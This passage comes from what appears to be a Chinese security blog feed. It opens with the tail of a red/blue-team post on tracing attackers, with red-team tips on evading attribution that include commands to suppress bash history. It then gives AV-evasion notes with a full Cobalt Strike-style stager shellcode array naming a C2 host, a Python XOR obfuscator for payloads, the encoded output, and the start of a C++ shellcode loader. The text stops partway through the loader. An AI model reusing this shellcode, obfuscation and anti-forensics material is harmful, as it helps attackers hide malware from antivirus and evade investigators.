IP及社交信息等</span><br><span class="line"> 利用条件：可以找到相关社交网站的jsonp接口泄露敏感信息，相关网站登录未注销</span><br></pre></td></tr></table></figure><h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><p>攻击路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击目的：拿到权限、窃取数据、获取利益、DDOS等</span><br><span class="line">网络代理：代理IP、跳板机、C2服务器等</span><br><span class="line">攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</span><br></pre></td></tr></table></figure><p> 攻击者身份画像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虚拟身份：ID、昵称、网名</span><br><span class="line">真实身份：姓名、物理位置</span><br><span class="line">联系方式：手机号、qq&#x2F;微信、邮箱</span><br><span class="line">组织情况：单位名称、职位信息</span><br></pre></td></tr></table></figure><h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222225526.png"></p><h3 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h3><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222225945.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222231625.png"></p><h2 id="防守组织架构"><a href="#防守组织架构" class="headerlink" title="防守组织架构"></a>防守组织架构</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222230535.png"></p><p>1、已知漏洞：演习之前，我们做了众测、红蓝对抗，发现了一些安全问题。相信这些问题，可能提前被某些攻击者已经掌握，于是将计就计，我们把这类漏洞做成诱饵。例如 shiro漏洞，springboot 的 actuator 监控等。</p><p>2、热门漏洞：今年演习一波三折，第一天爆出了几十个0day，何不将计就计？利用这些漏洞来做诱饵呢，配上一些历史域名、欺骗域名服用，效果更佳。例如用 vpn.b.cn 运行某服 VPN 程序。</p><p>3、产品特性：蜜罐厂家都有各自的特色。比如 A 家有Mysql 反制蜜罐，B家有RDP反制蜜罐，这些都可以合理搭配使用。</p><h2 id="溯源反制总结"><a href="#溯源反制总结" class="headerlink" title="溯源反制总结"></a>溯源反制总结</h2><p>参考：<a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222234241.png"></p><h1 id="如何防止溯源（红队角度）"><a href="#如何防止溯源（红队角度）" class="headerlink" title="如何防止溯源（红队角度）"></a>如何防止溯源（红队角度）</h1><blockquote><p>前面两点都是蓝队角度。说说红队如何防止被溯源吧。</p></blockquote><p>任何需要认证的地方，不用自己真实的，也不用任何和公司有关的名词。</p><p>任何需要交互操作的地方，都需要挂上全局代理，尽量不用暴露自己的真实ip，其次，警惕蜜罐，就那种看起来都多漏洞的站点，直接访问跳到后台，然后admin、123456就进去这种，稍微注意一下。</p><p>任何服务器，C2、文件服务器，扫描器，都要特殊用途特殊操作。</p><p>不开无用端口。</p><p>即：匿名性、专业性、精细化</p><hr><blockquote><p>别信所谓的绝对无后门，只不过是你发现不了。</p><p>很多神器没有办法自己开发也只能将就着用</p><p>所以我们为了避免信息泄露重</p><p>要文件绝对不能放在攻击机上。</p></blockquote><p>（1）所有工作均在虚拟机进行</p><p>（2）流量统一经网关走VPN进出</p><p>（3）不同需求分配不同虚拟机</p><p>（4）文件独立</p><p>（5）全盘加密&amp;拒绝弱密码</p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>真实APT的话，那肯定是高匿名性的。但是作为演习，一般就行了。</p><ol><li>线路匿名</li></ol><p>（1）网络接入点匿名</p><p>（2）途径节点匿名且加密</p><p>（3）使用的公网服务器匿名</p><ol start="2"><li>网络接入点匿名</li></ol><h2 id="安全操作恶习"><a href="#安全操作恶习" class="headerlink" title="安全操作恶习"></a>安全操作恶习</h2><p>（1）图省事物理机连VPN直接搞</p><p>这种情况基本意味着你没啥匿名可言</p><p>而且一般这么做的人</p><p>各种黑客软件也是直接在物理机运行。</p><p>妥妥的成别人肉鸡，还是会自觉上线的那种。</p><p>简直萌萌哒</p><p>（2）账户混用</p><p>比如在项目A中用了一个匿名邮箱</p><p>或者其他什么账户。</p><p>在项目B中继续使用。</p><p>这样的话有关机构很容易</p><p>根据这个邮箱把你的足迹关联起来</p><p>由B挖出A，可能你在B项目中其他都做得很好</p><p>没给别人机会追查你，但是</p><p>项目A由于是你早期做的项目</p><p>漏洞百出，给了他们追查你的机会。</p><p>（3）公私不分</p><p>最常见的就是随手把项目截图之类的东西</p><p>经由私人账户发到QQ微信</p><p>此外还有用私人邮箱，</p><p>手机号发送文件和信息。接收验证码之类。</p><p>（4）留特征值，这点多见于自写工具</p><p>（5）电脑不关机就离开</p><p>（6）黑页</p><p>（7）密码通用</p><p>（8）早期目标调研的时候用真实IP去访问</p><h2 id="反蜜罐"><a href="#反蜜罐" class="headerlink" title="反蜜罐"></a>反蜜罐</h2><p>有插件、也可以自己判断是否为蜜罐。</p><p>最好的方式是把浏览器中的登录记录给删点。或者是在虚拟机中操作。</p><h2 id="清除日志方式"><a href="#清除日志方式" class="headerlink" title="清除日志方式"></a>清除日志方式</h2><ul><li><code>kill &lt;bash process ID&gt;</code> 不会存储</li><li><code>set +o history</code> 不写入历史记录</li><li><code>unset HISTFILE</code> 清除历史记录的环境变量</li></ul><p>还有更多。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://help.aliyun.com/document_detail/99611.html">https://help.aliyun.com/document_detail/99611.html</a></p><p><a href="https://www.secrss.com/articles/26264">https://www.secrss.com/articles/26264</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13817637.html">https://www.cnblogs.com/xiaozi/p/13817637.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/defense/forensic.html">https://websec.readthedocs.io/zh/latest/defense/forensic.html</a></p><p><a href="https://www.freebuf.com/articles/network/202168.html">https://www.freebuf.com/articles/network/202168.html</a></p><p><a href="https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/">https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/</a></p><p><a href="https://zhuanlan.zhihu.com/p/26217643">https://zhuanlan.zhihu.com/p/26217643</a></p><p><a href="https://www.anquanke.com/post/id/197104">https://www.anquanke.com/post/id/197104</a></p><p><a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;温故而知新。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222210541.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>免杀学习：静态恶意代码逃逸</title>
    <link href="https://hack-for.fun/bd13.html"/>
    <id>https://hack-for.fun/bd13.html</id>
    <published>2021-02-20T02:52:10.000Z</published>
    <updated>2021-02-20T15:30:57.125Z</updated>
    
    <content type="html"><![CDATA[<p>了解了解</p><a id="more"></a><p>[toc]</p><h1 id="参考课程"><a href="#参考课程" class="headerlink" title="参考课程"></a>参考课程</h1><p>参考课程以及资料如下：</p><p>作者： 倾旋</p><p><a href="https://payloads.online/archivers/2019-09-24/1">后渗透下遇到的问题一（静态免杀）</a></p><ul><li><a href="https://payloads.online/archivers/2019-11-10/1">静态恶意代码逃逸（第一课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/2">静态恶意代码逃逸（第二课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/3">静态恶意代码逃逸（第三课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/4">静态恶意代码逃逸（第四课）</a></li><li><a href="https://payloads.online/archivers/2019-11-10/5">静态恶意代码逃逸（第五课）</a></li><li><a href="https://payloads.online/archivers/2020-01-02/1">静态恶意代码逃逸（第六课）</a></li><li><a href="https://payloads.online/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li><li><a href="https://payloads.online/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li><li><a href="https://payloads.online/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li><li>第十课 <a href="https://payloads.online/archivers/2021-02-08/1">https://payloads.online/archivers/2021-02-08/1</a></li></ul><p><a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p><p><strong>为了学习的完整性，推荐各位师傅去看原文学习，本文只是我的个人摘抄笔记，仅用做个人学习用途。</strong></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>通常在演练过程里，目的是追求快速的获取更多的权限，但是目标机器都安装了各种反病毒软件，种类繁多，大多对于静态查杀管控较为严格，导致一些工具无法使用。而在这个夹缝中生存的渗透师，就必须要学习更多的知识</p></blockquote><h2 id="关于代码"><a href="#关于代码" class="headerlink" title="关于代码"></a>关于代码</h2><p>一般来说，不管是Linux操作系统、Windows操作系统，可执行的应用程序文件，都遵循着一种格式：</p><ul><li>Linux ELF</li><li>Windows PE</li></ul><p>这种格式又包含了：可执行的应用程序、动态链接库等等，如Windows下的*.exe、*.dll。</p><p>而这些文件，其中都有一块空间用于保存程序的代码，也就是指令集，操作系统若想要执行一个文件，就要先将文件加载到内存，并分配相应的虚拟地址空间，创建一个进程和线程，线程再去执行程序的代码。</p><p>那么假设如上可以理解，就能够推断出常用的Shellcode加载器的工作原理：</p><ul><li>Shellcode是代码本身</li><li>加载器是具备读取代码的程序</li><li>加载器执行后，操作系统会创建一个进程与一个线程</li><li>第一个线程用于读取代码（Shellcode）并创建第二个线程，将线程执行的第一条指令指向代码（Shellcode）</li></ul><h2 id="关于内存"><a href="#关于内存" class="headerlink" title="关于内存"></a>关于内存</h2><p>在Windows操作系统中，每个进程互不干扰（除了公用的内核对象以外），都有自己的虚拟内存空间，而这一块线性的内存空间又被切成一页一页的大小，通常默认情况下，每页的大小是4KB。</p><p>Windows通过以页的单位来管理进程的虚拟内存空间，最典型的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用<code>VirtualAlloc</code> Windows API 可向操作系统申请内存空间，操作系统根据指定的大小来调整分配几页，并且会自动进行内存对齐。</p><blockquote><p>为什么要讲到内存呢，因为<strong>静态免杀的核心就是将代码加载至内存</strong>，理解内存的管理方式，才能产生更多的想法。</p></blockquote><h2 id="关于静态免杀"><a href="#关于静态免杀" class="headerlink" title="关于静态免杀"></a>关于静态免杀</h2><p>静态免杀，提起这个很多人会想到很久远的…. <strong>花指令、压缩壳、垃圾资源</strong> 等等。</p><p>但是由于Shellcode加载器的出现，很多人开始从源码方面出发，通过正常且无害的API来构建一个加载器。</p><p>目前见的最多的是两大加载器：</p><ul><li>Shellcode加载器</li><li>PE加载器</li></ul><p>两者有什么不同呢，我想可能就是加载的文件格式不同，但最终都要运行文件中的代码。</p><h1 id="静态恶意代码逃逸（第一课）"><a href="#静态恶意代码逃逸（第一课）" class="headerlink" title="静态恶意代码逃逸（第一课）"></a>静态恶意代码逃逸（第一课）</h1><h2 id="恶意代码的定义"><a href="#恶意代码的定义" class="headerlink" title="恶意代码的定义"></a>恶意代码的定义</h2><p>以下文章中的所有关于恶意代码的定义都以Cobaltstrike的载荷为例。</p><h2 id="Shellcode定义"><a href="#Shellcode定义" class="headerlink" title="Shellcode定义"></a>Shellcode定义</h2><p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p><h2 id="RAW-文件"><a href="#RAW-文件" class="headerlink" title="RAW 文件"></a>RAW 文件</h2><p>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的bin文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220130121.png"></p><p><strong>RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便</strong>，通常一般使用混淆的方式再生成一遍。</p><h2 id="C-文件"><a href="#C-文件" class="headerlink" title="C 文件"></a>C 文件</h2><p>C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h2><blockquote><p>采用混淆、加密解密的方式把载荷还原。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser, FileType</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bin</span>(<span class="params">num, src_fp, dst_fp, dst_raw</span>):</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    shellcode_size = <span class="number">0</span></span><br><span class="line">    shellcode_raw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            code = src_fp.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            base10 = ord(code) ^ num</span><br><span class="line">            base10_str = chr(base10)</span><br><span class="line">            shellcode_raw += base10_str.encode()</span><br><span class="line">            code_hex = hex(base10)</span><br><span class="line">            code_hex = code_hex.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span>(len(code_hex) == <span class="number">1</span>):</span><br><span class="line">                code_hex = <span class="string">&#x27;0&#x27;</span> + code_hex</span><br><span class="line">            shellcode += <span class="string">r&#x27;\x&#x27;</span> + code_hex</span><br><span class="line">            shellcode_size += <span class="number">1</span></span><br><span class="line">        src_fp.close()</span><br><span class="line">        dst_raw.write(shellcode_raw)</span><br><span class="line">        dst_raw.close()</span><br><span class="line">        dst_fp.write(shellcode)</span><br><span class="line">        dst_fp.close()</span><br><span class="line">        <span class="keyword">return</span> shellcode_size</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sys.stderr.writelines(str(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = ArgumentParser(prog=<span class="string">&#x27;Shellcode X&#x27;</span>, description=<span class="string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>,<span class="string">&#x27;--version&#x27;</span>,nargs=<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>,<span class="string">&#x27;--src&#x27;</span>,help=<span class="string">u&#x27;source bin file&#x27;</span>,type=FileType(<span class="string">&#x27;rb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>,<span class="string">&#x27;--dst&#x27;</span>,help=<span class="string">u&#x27;destination shellcode file&#x27;</span>,type=FileType(<span class="string">&#x27;w+&#x27;</span>),required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--num&#x27;</span>,help=<span class="string">u&#x27;Confused number&#x27;</span>,type=int, default=<span class="number">90</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;--raw&#x27;</span>,help=<span class="string">u&#x27;output bin file&#x27;</span>, type=FileType(<span class="string">&#x27;wb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)</span><br><span class="line">    sys.stdout.writelines(<span class="string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.format(shellcode_size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>把raw文件混淆，生成c语言数组</p><p>反感：</p><p>先生成bin文件，然后运行python脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r RAW</span><br></pre></td></tr></table></figure><p>在payload.c中会看到raw文件里的每一个字节与10的异或运算出的C语言数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x3b\xca\x60\x4a\xbe\x1a\x62\x0a\x1a\x0a\x0a\x62\xf5\xf5\x0d\x0a\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x89\xca\x4a\x83\xcd\x5a\x3b\xca\xba\x7a\xbe\x63\x5a\x62\x6e\x64\x79\x6b\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\xb1\x6b\x0a\x0a\x0a\xe1\x71\x52\x83\xcc\x89\xe5\x4a\xf6\xb3\x4a\x0a\x0a\x0a\xf9\xae\x83\xf2\x89\xe2\x4a\x4a\x8a\xf1\x70\x74\x38\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x10\xb1\x6b\x0a\x0a\x0a\x82\x12\x4a\x81\x12\x49\x82\x12\x8a\xf1\x70\x74\x0d\xb1\x6b\x0a\x0a\x0a\x82\x12\x42\x42\xb1\x6b\x0a\x0a\x0a\x82\x12\x83\xf9\x83\xcc\x5e\x51\x89\xe1\x0e\x59\x60\x0a\x59\x60\x0a\x62\x42\x08\x0a\x0a\x60\x1a\x5a\x62\x60\xc3\x96\xc3\xf5\xdf\x8f\xca\x7f\x5b\x83\xfa\x42\xb9\x0a\x82\x12\x4a\x81\x3a\xe1\x7a\xe2\x8a\xf5\xf5\xf5\x0a\x6b\x6b\x6b\x24\x66\x65\x7c\x6f\x38\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x24\x66\x65\x7c\x6f\x24\x6f\x79\x79\x62\x65\x7a\x7d\x6f\x68\x24\x72\x73\x70\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x83\xfa\x42\x81\x02\x4b\x82\x02\x8a\xf3\x55\x74\x0d\x62\xfa\xbf\xa8\x5c\xf5\xdf\x62\xe2\x19\x0a\x0a\x62\x4e\xfa\x3f\xea\xf5\xdf\x83\xfa\x81\x02\x83\xc1\xe3\x29\xf5\xf5\xf5\x8d\xf0\x55\x81\x4d\x12\x89\xf2\x0b\x7f\x33\x89\xcd\x16\x81\x35\x8d\xd4\x83\xf4\x81\x76\x2e\x02\x3b\xc3\xbb\xf5\xf9\xae\x5d\x5d\x5d\x49\x8d\xf0\x58\x5d\x59\x8b\xe0\xf5\x0a\x0a\x0a\x58\x62\xfe\x0a\x84\xc6\xf5\xdf\x51\x55\x50\x37\xf5\x0a\x0a\x0a\x76\x0d\xe3\xd5\xf4\xf5\xf5\x83\xdd\x8b\xcd\x1f\x0a\x0a\x0a\xf5\xed\x0a\x0a\x0a\x0a</span><br></pre></td></tr></table></figure><h1 id="静态恶意代码逃逸（第二课）"><a href="#静态恶意代码逃逸（第二课）" class="headerlink" title="静态恶意代码逃逸（第二课）"></a>静态恶意代码逃逸（第二课）</h1><h2 id="关于Windows操作系统内存"><a href="#关于Windows操作系统内存" class="headerlink" title="关于Windows操作系统内存"></a>关于Windows操作系统内存</h2><p>Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>在进程申请时，需要声明这块内存的基本信息：<strong>申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</strong></p><p>申请方式：</p><ul><li>HeapAlloc</li><li>malloc</li><li>VirtualAlloc</li><li>new</li><li>LocalAlloc</li><li>…</li></ul><h2 id="申请内存API的关系"><a href="#申请内存API的关系" class="headerlink" title="申请内存API的关系"></a>申请内存API的关系</h2><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p><h2 id="实现一次正常加载"><a href="#实现一次正常加载" class="headerlink" title="实现一次正常加载"></a>实现一次正常加载</h2><p>使用cobaltstrike默认的shellcode进行加载</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span 